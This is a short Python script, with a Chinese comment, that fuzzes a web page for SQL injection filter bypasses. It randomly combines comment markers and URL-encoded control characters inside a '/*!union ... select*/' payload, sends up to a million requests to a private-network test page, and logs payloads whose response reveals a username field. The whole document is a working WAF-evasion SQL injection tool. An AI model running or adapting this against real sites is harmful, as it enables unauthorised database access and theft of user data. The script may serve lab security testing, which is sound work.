# 从fuzz数组随机取
import requests
import random

fuzz_zs = ['/*','*/','/*!','/**/','?','/','*','=','`','!','%','.','-','+']
fuzz_sz = ['']
fuzz_ch = ['%0a','%0b','%0c','%0d','%0e','%0f','%0g','%0h','%0i','%0j']

fuzz = fuzz_zs + fuzz_sz + fuzz_ch
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}
target = 'http://192.168.20.222/sqltest.php?x=1'
nums = len(fuzz) ** 5
num = 0

for i in range(1000000):
    a = random.choice(fuzz)
    b = random.choice(fuzz)
    c = random.choice(fuzz)
    d = random.choice(fuzz)
    e = random.choice(fuzz)
    num += 1
    payload = "/*!union" + a + b + c + d + e + "select*/ 1,2,3"
    url = target + payload
    print('[{}] {}'.format(num, url))
    res = requests.get(url)
    if '用户名' in res.text:
        with open('ret1.txt','at',encoding='utf-8') as f:
            f.writelines(url + '\n')